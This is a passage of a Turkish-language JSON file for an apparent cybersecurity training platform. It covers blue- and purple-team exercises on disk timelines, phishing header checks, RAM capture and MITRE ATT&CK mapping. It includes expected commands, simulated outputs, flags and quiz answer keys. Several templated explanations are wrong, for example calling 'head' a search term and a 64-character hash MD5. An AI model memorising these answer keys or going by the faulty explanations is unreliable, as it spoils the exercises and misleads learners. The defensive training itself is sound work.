                "token": "C:",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (C:)."
            },
            {
                "token": "image.dd",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (image.dd)."
            },
            {
                "token": "|",
                "role": "Boru İşareti (Pipe / Aktarım)",
                "desc": "Sol taraftaki komutun ürettiği ekran çıktısını alır, sağ taraftaki komuta girdi olarak aktarır (iki komutu birbirine bağlar)."
            },
            {
                "token": "head",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (head)."
            },
            {
                "token": "-n",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-n)."
            },
            {
                "token": "5",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (5)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "0|C:/Windows/Temp/mimikatz.exe|0|d/drwxrwxrwx|0|0|1024|1762635600|176263...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "0|C:/Windows/System32/Tasks/TelemetryUpdate|0|r/rrwxrwxrwx|0|0|2048|1762...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[ZAMAN ÇİZELGESİ ÇIKARILDI] 21:00'da zararlı dosyanın yüklendiği ve 21:0...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "fls",
                "desc": "Bu odadaki (Disk Adli Bilişimi: $MFT ve Olay Zaman Çizelgesi (Timelining)) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "mactime",
                "desc": "Bu odadaki (Disk Adli Bilişimi: $MFT ve Olay Zaman Çizelgesi (Timelining)) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `fls -r -m C: image.dd | head -n 5` komutunun temel amacı nedir?",
            "options": [
                "fls aracıyla disk imajındaki dosya meta verilerini çekip olay zaman çizelgesini oluşturmak için fls -r -m C: image.dd | head -n 5",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `fls -r -m C: image.dd | head -n 5` komutu ezbere yazılan bir kod değil; fls: The Sleuth Kit (TSK) dosya listeleme komutudur. -m C:: Dosya yollarını mactime zaman çizelgesi formatında biçimlendirir."
        }
    },
    {
        "id": "blue-309",
        "track": "blue",
        "title": "E-Posta Güvenliği: Oltalama (Phishing) Başlık Analizi",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "EMAIL FORENSICS & DMARC",
        "theory": "### Sahte Mektubun İpliğini Pazara Çıkarmak: E-Posta Header Analizi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nSize 'Banka Genel Müdürü' imzasıyla gelen bir mektubun üzerindeki posta pulunu mikroskopla incelemek gibidir. Mektubun üzerinde bankanın logosu olsa bile, posta damgasının Nijerya'dan vurulduğunu görmek mektubun sahte olduğunu kanıtlar.\n\n#### SPF, DKIM ve DMARC Üçlüsü:\n* **SPF (Sender Policy Framework):** Bu sunucunun şirket adına e-posta gönderme yetkisi var mı?\n* **DKIM (DomainKeys Identified Mail):** E-posta yoldayken değiştirildi mi (Kriptografik imza)?\n* **DMARC:** SPF veya DKIM başarısız olursa mektubu çöpe at (p=reject) kuralı.",
        "mission": "Şüpheli fatura e-postasının kimlik doğrulama başlıklarını incelemek için grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml komutunu çalıştırın.",
        "expectedCommand": "grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml",
        "acceptedCommands": [
            "grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml",
            "grep -E \"Authentication-Results|Received-SPF|dmarc\" invoice.eml",
            "grep -i 'spf' invoice.eml"
        ],
        "hintExplanation": "<p><strong>grep -E:</strong> Çoklu anahtar kelimeleri regex mantığıyla tek seferde arar.</p><p><strong>invoice.eml:</strong> İncelenen ham e-posta formatındaki şüpheli dosyadır.</p>",
        "terminalSuccessOutput": "Received-SPF: Fail (protection.outlook.com: domain of evil-bank.com does not designate 194.26.29.11 as permitted sender)\nAuthentication-Results: spf=fail (sender IP is 194.26.29.11) smtp.mailfrom=evil-bank.com; dkim=fail; dmarc=fail\n[OLTALAMA KANITLANDI] Gönderici IP adresi bankanın SPF listesinde yok; DMARC FAIL verdi!\n[FLAG] LFL{blue_phishing_eml_header_dmarc_fail_analyzed}",
        "flag": "LFL{blue_phishing_eml_header_dmarc_fail_analyzed}",
        "nextId": "blue-310",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml` komutunu kullanmamızın sebebi; **E-Posta Güvenliği: Oltalama (Phishing) Başlık Analizi** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. grep -E: Çoklu anahtar kelimeleri regex mantığıyla tek seferde arar. invoice.eml: İncelenen ham e-posta formatındaki şüpheli dosyadır.",
        "cmdAnatomy": [
            {
                "token": "grep",
                "role": "Ana Komut (Metin Filtreleme)",
                "desc": "Samanlıkta iğne arar gibi binlerce satırlık yazı içinde sadece aradığın kelimeyi içeren satırları süzüp getirir."
            },
            {
                "token": "-E",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-E)."
            },
            {
                "token": "'Authentication-Results|Received-SPF|dmarc'",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman ('Authentication-Results|Received-SPF|dmarc')."
            },
            {
                "token": "invoice.eml",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (invoice.eml)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Received-SPF: Fail (protection.outlook.com: domain of evil-bank.com does...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Authentication-Results: spf=fail (sender IP is 194.26.29.11) smtp.mailfr...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[OLTALAMA KANITLANDI] Gönderici IP adresi bankanın SPF listesinde yok; D...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "grep",
                "desc": "E-Posta Güvenliği: Oltalama (Phishing) Başlık Analizi görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml` komutunun temel amacı nedir?",
            "options": [
                "Şüpheli fatura e-postasının kimlik doğrulama başlıklarını incelemek için grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml` komutu ezbere yazılan bir kod değil; grep -E: Çoklu anahtar kelimeleri regex mantığıyla tek seferde arar. invoice.eml: İncelenen ham e-posta formatındaki şüpheli dosyadır."
        }
    },
    {
        "id": "blue-310",
        "track": "blue",
        "title": "Olay Müdahale: Canlı RAM Dökümü & Tehdit İzolasyonu",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "LIVE MEMORY TRIAGE & INCIDENT RESPONSE",
        "theory": "### Bilgisayarı Kapatma, Delilleri Koru!: Canlı Bellek Müdahalesi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir suç mahalline giren polisin ilk kuralı 'Hiçbir şeye dokunma, parmak izlerini dondur'dur. Bilgisayar kapatılırsa RAM'deki tüm enjekte edilmiş zararlı kodlar ve şifreleme anahtarları sonsuza dek uçar. Önce ağ fişi çekilir (İzolasyon), ardından RAM kopyalanır.\n\n#### winpmem / LiME Araçları:\nÇalışan sistemin belleğini (RAM) fiziksel sektörlerden sıfır veri kaybıyla okuyup `memdump.raw` dosyası olarak harici güvenli diske döker.",
        "mission": "Saldırıya uğrayan makinenin canlı bellek dökümünü almak için winpmem.exe -o memdump.raw --volume_mode 2 komutunu çalıştırın.",
        "expectedCommand": "winpmem.exe -o memdump.raw --volume_mode 2",
        "acceptedCommands": [
            "winpmem.exe -o memdump.raw --volume_mode 2",
            "winpmem -o memdump.raw",
            "winpmem.exe -o memdump.raw"
        ],
        "hintExplanation": "<p><strong>winpmem:</strong> Windows işletim sistemlerinde açık kaynaklı RAM bellek döküm alma aracıdır.</p><p><strong>-o memdump.raw:</strong> Çıktının yazılacağı adli bellek imaj dosyasını belirtir.</p>",
        "terminalSuccessOutput": "WinPmem 4.0 - Physical Memory Imager\nDriver loaded successfully.\nCR3: 0x001aa000\nMemory size: 16384 MB (16.0 GB)\nWriting memory dump to memdump.raw.....\n[100%] Memory acquisition completed in 18.4 seconds.\nMD5 Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n[DELİL MÜHÜRLENDİ] Canlı RAM başarıyla imajlandı; Volatility analizine hazır!\n[FLAG] LFL{blue_incident_response_live_ram_dump_quarantined}",
        "flag": "LFL{blue_incident_response_live_ram_dump_quarantined}",
        "nextId": "blue-311",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `winpmem.exe -o memdump.raw --volume_mode 2` komutunu kullanmamızın sebebi; **Olay Müdahale: Canlı RAM Dökümü & Tehdit İzolasyonu** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. winpmem: Windows işletim sistemlerinde açık kaynaklı RAM bellek döküm alma aracıdır. -o memdump.raw: Çıktının yazılacağı adli bellek imaj dosyasını belirtir.",
        "cmdAnatomy": [
            {
                "token": "winpmem.exe",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (winpmem.exe)."
            },
            {
                "token": "-o",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-o)."
            },
            {
                "token": "memdump.raw",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (memdump.raw)."
            },
            {
                "token": "--volume_mode",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--volume_mode)."
            },
            {
                "token": "2",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (2)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "WinPmem 4.0 - Physical Memory Imager",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Driver loaded successfully.",
                "meaning": "İşlemin veya bağlantının **başarıyla** gerçekleştiğini doğrulayan sonuç satırıdır."
            },
            {
                "snippet": "CR3: 0x001aa000",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Memory size: 16384 MB (16.0 GB)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "memdump.raw",
                "desc": "Bu odadaki (Olay Müdahale: Canlı RAM Dökümü & Tehdit İzolasyonu) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `winpmem.exe -o memdump.raw --volume_mode 2` komutunun temel amacı nedir?",
            "options": [
                "Saldırıya uğrayan makinenin canlı bellek dökümünü almak için winpmem.exe -o memdump.raw --volume_mode 2",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `winpmem.exe -o memdump.raw --volume_mode 2` komutu ezbere yazılan bir kod değil; winpmem: Windows işletim sistemlerinde açık kaynaklı RAM bellek döküm alma aracıdır. -o memdump.raw: Çıktının yazılacağı adli bellek imaj dosyasını belirtir."
        }
    },
    {
        "id": "blue-311",
        "track": "blue",
        "title": "Blue Team Zirvesi: Tehdit Savuşturma & Nihai Kök Neden Raporu",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "SOC INCIDENT REMEDIATION & ROOT CAUSE",
        "theory": "### Savunmanın Zirvesi: Saldırganı Kovup Sistemi Zırhlamak\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nYangını söndürdünüz, hastayı iyileştirdiniz ve binadaki tüm kırık kapıları çelik kapıyla değiştirdiniz. Şimdi şirket yönetim kuruluna 'Saldırgan şu oltalama e-postasından girdi, şu zafiyeti kullandı, şu saatte temizlendi ve bir daha asla giremez' diyerek nihai kök neden (Root Cause) raporunu sunuyorsunuz.\n\n#### 17 Blue Team Odasını Tamamladınız!\nSyslog'dan SIEM'e, Snort NIDS'ten Sysmon'a, Zeek'ten Volatility RAM analizine kadar uçtan uca modern bir Kıdemli SOC Analisti ve Adli Bilişim Uzmanı oldunuz.",
        "mission": "Nihai olay müdahale ve kök neden analiz raporunu okumak için cat /opt/soc/incident_reports/IR-2026-FINAL.txt komutunu çalıştırın.",
        "expectedCommand": "cat /opt/soc/incident_reports/IR-2026-FINAL.txt",
        "acceptedCommands": [
            "cat /opt/soc/incident_reports/IR-2026-FINAL.txt",
            "cat IR-2026-FINAL.txt",
            "more /opt/soc/incident_reports/IR-2026-FINAL.txt"
        ],
        "hintExplanation": "<p><strong>IR-2026-FINAL.txt:</strong> 17 odalık Blue Team savunma patikasını bitirdiğinizde açılan adli rapor bayrağıdır.</p>",
        "terminalSuccessOutput": "========================================================================\n🛡️ TEBRİKLER! BLUE TEAM DEFANSİF SAVUNMA PATİKASINI TAMAMLADINIZ! 🛡️\n========================================================================\n[KAZANILAN DEFANSİF YETKİNLİKLER]:\n✔ Log & SIEM Mimarisi: Syslog, Auth logları, Wazuh & Splunk Analizi\n✔ Ağ & Trafik Güvenliği: Snort, Suricata, Zeek & Wireshark Tehdit Avı\n✔ Uç Nokta Denetimi: Sysmon Event IDs (1, 8, 10) & YARA Kural Mühendisliği\n✔ Dijital Adli Bilişim & IR: Volatility RAM, MFT Zaman Çizelgesi & DMARC\n\n[BLUE TEAM NİHAİ BAYRAĞI]: LFL{blue_soc_incident_remediation_root_cause_solved}\n========================================================================",
        "flag": "LFL{blue_soc_incident_remediation_root_cause_solved}",
        "nextId": "purple-101",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Olay Müdahalesi ve Adli Bilişim) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `cat /opt/soc/incident_reports/IR-2026-FINAL.txt` komutunu kullanmamızın sebebi; **Blue Team Zirvesi: Tehdit Savuşturma & Nihai Kök Neden Raporu** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. IR-2026-FINAL.txt: 17 odalık Blue Team savunma patikasını bitirdiğinizde açılan adli rapor bayrağıdır.",
        "cmdAnatomy": [
            {
                "token": "cat",
                "role": "Ana Komut (Concatenate / Dosya Oku)",
                "desc": "Bir metin dosyasının içindeki yazıları açıp doğrudan terminal ekranına yazdırır."
            },
            {
                "token": "/opt/soc/incident_reports/IR-2026-FINAL.txt",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (/opt/soc/incident_reports/IR-2026-FINAL.txt)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "========================================================================",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "🛡️ TEBRİKLER! BLUE TEAM DEFANSİF SAVUNMA PATİKASINI TAMAMLADINIZ! 🛡️",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "========================================================================",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[KAZANILAN DEFANSİF YETKİNLİKLER]:",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "cat",
                "desc": "Blue Team Zirvesi: Tehdit Savuşturma & Nihai Kök Neden Raporu görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `cat /opt/soc/incident_reports/IR-2026-FINAL.txt` komutunun temel amacı nedir?",
            "options": [
                "Nihai olay müdahale ve kök neden analiz raporunu okumak için cat /opt/soc/incident_reports/IR-2026-FINAL.txt",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `cat /opt/soc/incident_reports/IR-2026-FINAL.txt` komutu ezbere yazılan bir kod değil; IR-2026-FINAL.txt: 17 odalık Blue Team savunma patikasını bitirdiğinizde açılan adli rapor bayrağıdır."
        }
    },
    {
        "id": "purple-101",
        "track": "purple",
        "title": "MITRE ATT&CK & Cyber Kill Chain: TTP Haritalandırma",
        "level": "1. Metodoloji ve Çerçeve",
        "badge": "MITRE ATT&CK & TTPs",
        "theory": "### İki Cephenin Ortak Dili: Purple Team Zihniyeti\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir futbol maçında forvet (Red Team) sadece gol atmaya, defans (Blue Team) ise gol yememeye çalışır. Purple Team sahadaki teknik direktördür! \"Forvet soldan bindirme yaptığında defans nerede durmalıydı?\" analizini yapar ve taktikleri eşleştirir.\n\nPurple Team bağımsız bir silo veya üçüncü bir ekip olmaktan ziyade bir zihniyet ve metodolojidir.\n\n#### 1. TTP ve Log Karşılığı (Mapping):\nBir Purple Teamer sadece \"Saldırgan komut çalıştırdı\" demez. \"Saldırgan `T1059.001 (PowerShell)` tekniğini kullandı ve bu aktivite hedef hostta `Microsoft-Windows-PowerShell/Operational Event ID 4104 (Script Block Logging)` kaydı üretmelidir\" diyerek hücum ile tespiti birebir eşleştirir.",
        "mission": "Saldırganın kullandığı 'whoami /priv' komutunu MITRE ATT&CK Discovery taktiği altındaki T1033 tekniğiyle eşleştiren analiz doğrulamasını yapın.",
        "expectedCommand": "python3 mitre_mapper.py --technique T1033",
        "acceptedCommands": [
            "mitre-map --technique T1033 --command 'whoami /priv'",
            "mitre-map T1033",
            "python3 mitre_mapper.py"
        ],
        "hintExplanation": "<p><strong>python3 mitre_mapper.py:</strong> Saldırı komutlarını dünya standardı olan MITRE ATT&CK matrisiyle eşleştiren Purple Team otomasyon betiğidir.</p>\n<p><strong>--technique T1033:</strong> 'System Owner/User Discovery' tekniğidir. Bu teknik çalıştırıldığında hedef sistemde Sysmon Event ID 1 (Process Creation) logunun üretilmesi gerektiğini doğrular.</p>",
        "terminalSuccessOutput": "[PURPLE FRAMEWORK] TTP Eşleştirme Motoru\nTaktik: TA0007 (Discovery)\nTeknik: T1033 (System Owner/User Discovery)\nBeklenen Log Kaynağı: Sysmon Event ID 1 (Process Creation) / Security Event ID 4688\nTespit Eşiği: Standart kullanıcı kabuğunda ardışık yetki denetimi çağrısı.\n[FLAG] LFL{mitre_ttp_mapping_discovery_t1033}",
        "flag": "LFL{mitre_ttp_mapping_discovery_t1033}",
        "nextId": "purple-102",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (1. Metodoloji ve Çerçeve) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `python3 mitre_mapper.py --technique T1033` komutunu kullanmamızın sebebi; **MITRE ATT&CK & Cyber Kill Chain: TTP Haritalandırma** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. python3 mitre_mapper.py: Saldırı komutlarını dünya standardı olan MITRE ATT&CK matrisiyle eşleştiren Purple Team otomasyon betiğidir. --technique T1033: 'System Owner/User Discovery' tekniğidir. Bu teknik çalıştırıldığında hedef sistemde Sysmon Event ID 1 (Process Creation) logunun üretilmesi gerektiğini doğrular.",
        "cmdAnatomy": [
            {
                "token": "python3",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (python3)."
            },
            {
                "token": "mitre_mapper.py",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (mitre_mapper.py)."
            },
            {
                "token": "--technique",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--technique)."
            },
            {
                "token": "T1033",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (T1033)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[PURPLE FRAMEWORK] TTP Eşleştirme Motoru",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Taktik: TA0007 (Discovery)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Teknik: T1033 (System Owner/User Discovery)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Beklenen Log Kaynağı: Sysmon Event ID 1 (Process Creation) / Security Ev...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "T1059.001 (PowerShell)",
                "desc": "Bu odadaki (MITRE ATT&CK & Cyber Kill Chain: TTP Haritalandırma) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `python3 mitre_mapper.py --technique T1033` komutunun temel amacı nedir?",
            "options": [
                "Saldırganın kullandığı 'whoami /priv' komutunu MITRE ATT&CK Discovery taktiği altındaki T1033 tekniğiyle eşleştiren analiz doğrulamasını yapın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `python3 mitre_mapper.py --technique T1033` komutu ezbere yazılan bir kod değil; python3 mitre_mapper.py: Saldırı komutlarını dünya standardı olan MITRE ATT&CK matrisiyle eşleştiren Purple Team otomasyon betiğidir. --technique T1033: 'System Owner/User Discovery' tekniğidir. Bu teknik çalıştırıldığında hedef sistemde Sysmon Event ID 1 (Process Creation) logunun üretilmesi gerektiğini doğrular."
        }
    },
    {
        "id": "purple-102",
        "track": "purple",
        "title": "Ortak Raporlama & Boşluk Analizi (Gap Analysis)",
        "level": "1. Metodoloji ve Çerçeve",
        "badge": "GAP ANALYSIS & METRICS",
        "theory": "### Siloları Yıkmak: Hücum ve Savunma Diyaloğu\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nEvinizin etrafında 10 tane güvenlik kamerası var. Purple Team evin etrafını dolaşarak \"Hangi kameranın önünü ağaç dalı kapatmış, hangi köşede kör nokta kalmış?\" renkli ısı haritası (Heatmap) çıkarır ve kör noktaları gösterir.\n\nKlasik sızma testleri sonrasında Red Team 100 sayfalık teknik rapor bırakır, Blue Team ise günlük alarm gürültüsünde boğulur. Purple Team bu kopukluğu onarır.\n\n#### 1. Savunma Boşluğu (Gap Analysis):\n* Kırmızı Takım bir teknik denedi: Başarılı oldu mu?\n* Mavi Takım bunu gördü mü? (Tespit: Evet/Hayır)\n* Alarm üretti mi? (Alarm: Evet/Hayır)",
        "mission": "Son sızma testi bulguları için MITRE Navigator formatında boşluk analizi (Gap Analysis) özet raporunu derleyin.",
        "expectedCommand": "python3 gap_analysis.py --report pentest.json",
        "acceptedCommands": [
            "lfl-purple-matrix --generate-gap --input pentest_eval.json",
            "gap-analysis --report pentest.json",
            "python3 gap_analysis.py"
        ],
        "hintExplanation": "<p><strong>python3 gap_analysis.py:</strong> Hücum ile savunma ekiplerinin sonuçlarını karşılaştıran analiz betiğidir.</p>\n<p><strong>--report pentest.json:</strong> Pentest bulgularını girdi olarak alır ve 'Hangi saldırıları gördük, hangilerinde alarm vermedik?' sorusunun yanıtını (Isı Haritası - Heatmap) çıkarır.</p>",
        "terminalSuccessOutput": "[+] ATT&CK Navigator Katmanı Oluşturuldu...\nTest Edilen Teknik Sayısı: 48\nBaşarıyla Yakalanan (Detected): 29 (%60.4)\nLoglanan Ancak Alarm Vermeyen: 12 (%25.0)\nKÖRLÜK YAŞANAN TEKNİKLER (Blind Spots): 7 (%14.6)\n[Kritik Boşluk]: T1003.001 (LSASS Bellek Dökümü - Alarm üretmedi!)\n[FLAG] LFL{purple_gap_analysis_heatmap_scored}",
        "flag": "LFL{purple_gap_analysis_heatmap_scored}",
        "nextId": "purple-201",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (1. Metodoloji ve Çerçeve) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `python3 gap_analysis.py --report pentest.json` komutunu kullanmamızın sebebi; **Ortak Raporlama & Boşluk Analizi (Gap Analysis)** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. python3 gap_analysis.py: Hücum ile savunma ekiplerinin sonuçlarını karşılaştıran analiz betiğidir. --report pentest.json: Pentest bulgularını girdi olarak alır ve 'Hangi saldırıları gördük, hangilerinde alarm vermedik?' sorusunun yanıtını (Isı Haritası - Heatmap) çıkarır.",
        "cmdAnatomy": [
            {
                "token": "python3",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (python3)."
            },
            {
                "token": "gap_analysis.py",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (gap_analysis.py)."
            },
            {
                "token": "--report",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--report)."
            },
            {
                "token": "pentest.json",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (pentest.json)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] ATT&CK Navigator Katmanı Oluşturuldu...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Test Edilen Teknik Sayısı: 48",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Başarıyla Yakalanan (Detected): 29 (%60.4)",
                "meaning": "Güvenlik analiz aracının şüpheli saldırı izini veya zararlı aktiviteyi **tespit ettiğini** gösteren uyarı satırıdır."
            },
            {
                "snippet": "Loglanan Ancak Alarm Vermeyen: 12 (%25.0)",
                "meaning": "Güvenlik analiz aracının şüpheli saldırı izini veya zararlı aktiviteyi **tespit ettiğini** gösteren uyarı satırıdır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "python3",
                "desc": "Ortak Raporlama & Boşluk Analizi (Gap Analysis) görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `python3 gap_analysis.py --report pentest.json` komutunun temel amacı nedir?",
            "options": [
